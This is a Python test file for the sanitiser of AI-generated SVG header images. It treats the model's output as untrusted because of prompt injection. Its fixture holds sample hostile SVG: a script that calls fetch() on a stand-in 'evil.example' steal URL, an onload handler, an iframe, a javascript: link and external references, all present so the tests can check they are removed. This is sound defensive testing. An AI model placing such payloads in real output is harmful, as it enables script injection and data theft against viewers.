"""Regression tests for the AI header-image SVG pipeline's security gate.

The model's output is untrusted: it can contain <script>, event handlers,
<foreignObject>, embedded raster, and external references — by accident or via
prompt injection. These tests pin the behaviour of extract/sanitize/validate so
a future refactor can't silently let an injection vector through.
"""
from app.services.anthropic_service import extract_svg, sanitize_svg, validate_svg


HOSTILE = """Here is your header:
```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 630">
  <title>Test</title>
  <script>fetch('https://evil.example/steal')</script>
  <rect width="1200" height="630" fill="#fcfeff" onload="alert(1)"/>
  <foreignObject><iframe src="https://evil.example"></iframe></foreignObject>
  <image href="https://evil.example/x.png" width="100" height="100"/>
  <a xlink:href="javascript:alert(2)"><text x="80" y="300" fill="#1a1c1f">Hi</text></a>
  <text x="80" y="400" fill="#0076d1" style="background:url(https://evil.example/f.png)">Ashford &amp; Briggs</text>
</svg>
```
Hope you like it!"""


def _clean(raw: str) -> str:
    return sanitize_svg(extract_svg(raw) or "")


def test_extract_pulls_svg_from_fences_and_prose():
    svg = extract_svg(HOSTILE)
    assert svg is not None
    assert svg.startswith("<svg")
    assert svg.endswith("</svg>")
    assert "```" not in svg
    assert "Hope you like" not in svg


def test_sanitize_strips_every_injection_vector():
    svg = _clean(HOSTILE)
    lowered = svg.lower()
    for bad in ("<script", "onload", "<foreignobject", "<image",
                "javascript:", "evil.example"):
        assert bad not in lowered, f"{bad!r} survived sanitization"


def test_sanitize_preserves_legitimate_markup():
    svg = _clean(HOSTILE)
    assert "Ashford &amp; Briggs" in svg   # XML-escaped brand text kept
    assert 'fill="#0076d1"' in svg          # accent color kept
    assert "<rect" in svg                   # geometry kept


def test_hostile_input_validates_after_sanitizing():
    ok, reason = validate_svg(_clean(HOSTILE))
    assert ok, reason


def test_non_svg_response_fails_cleanly():
    ok, reason = validate_svg(_clean("I could not draw that, sorry."))
    assert not ok
    assert reason


def test_missing_viewbox_is_rejected():
    ok, reason = validate_svg("<svg xmlns='http://www.w3.org/2000/svg'></svg>")
    assert not ok
    assert "viewBox" in reason


def test_oversized_svg_is_rejected():
    huge = '<svg viewBox="0 0 1 1">' + ("<rect/>" * 20000) + "</svg>"
    ok, reason = validate_svg(huge)
    assert not ok
